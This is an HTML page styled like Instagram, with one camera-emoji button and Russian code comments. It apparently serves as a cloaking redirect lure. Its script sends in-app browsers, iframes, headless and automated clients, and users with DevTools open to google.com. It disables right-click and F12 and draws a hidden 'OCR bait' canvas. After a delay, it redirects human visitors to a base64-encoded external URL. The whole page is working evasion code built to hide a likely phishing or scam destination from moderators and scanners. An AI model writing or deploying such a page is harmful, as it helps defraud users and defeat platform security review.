<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>📷</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <meta name="robots" content="noindex, nofollow" />
  <style>
    html, body {
      margin: 0;
      padding: 0;
      height: 100%;
      background: linear-gradient(to bottom, #f09433, #e6683c, #dc2743, #cc2366, #bc1888);
      font-family: system-ui, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
    }
    .btn {
      background-color: white;
      color: black;
      border: none;
      border-radius: 999px;
      padding: 0.5rem 9rem;
      font-size: 2rem;
      cursor: pointer;
      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.2);
    }
    canvas.ocr-bait {
      display: none;
    }
  </style>
</head>
<body>
  <button class="btn" onclick="go()">📷</button>
  <canvas class="ocr-bait" id="ocr"></canvas>

  <script>
    // Защита от встроенных браузеров и iframe
    (function() {
      const ua = navigator.userAgent.toLowerCase();
      const badAgents = [
        "instagram", "fbav", "facebook", "tinder", "okhttp", 
        "webview", "line", "pinterest", "telegram", "grindr"
      ];
      const isWebview = badAgents.some(agent => ua.includes(agent));
      if (
        isWebview || 
        window.top !== window.self || 
        navigator.webdriver || 
        navigator.plugins.length === 0 || 
        !navigator.languages
      ) {
        location.href = "https://google.com";
      }
    })();

    // OCR приманка для визуальных ботов
    (function() {
      const canvas = document.getElementById("ocr");
      const ctx = canvas.getContext("2d");
      canvas.width = 300;
      canvas.height = 80;
      ctx.font = "20px Arial";
      ctx.fillStyle = "black";
      ctx.fillText("https://gayron.life/rehbixee", 10, 50);
    })();

    // Детекция нестандартного окна headless
    setInterval(() => {
      if (window.outerWidth - window.innerWidth > 160 || window.outerHeight - window.innerHeight > 160) {
        location.href = "https://google.com";
      }
    }, 500);

    // Блокировка контекстного меню и DevTools (F12, Ctrl+Shift+I)
    document.addEventListener("contextmenu", e => e.preventDefault());
    document.onkeydown = e => {
      if (e.keyCode === 123 || (e.ctrlKey && e.shiftKey && e.keyCode === 73)) return false;
    };

    // Проверка взаимодействия пользователя
    let interacted = false;
    document.addEventListener("mousemove", () => interacted = true);
    document.addEventListener("touchstart", () => interacted = true);
    document.addEventListener("keypress", () => interacted = true);

    // Простая base64-ссылка для редиректа
    function go() {
      if (!interacted) return;
      setTimeout(() => {
        const encoded = "aHR0cHM6Ly9nYXlyb24ubGlmZS9yZWhiaXhlZQ=="; // base64 от https://gayron.life/rehbixee
        const decoded = atob(encoded);
        if (decoded.startsWith("http")) {
          location.href = decoded;
        } else {
          console.error("Decoded URL invalid:", decoded);
        }
      }, 1500 + Math.random() * 500);
    }
  </script>
</body>
</html>
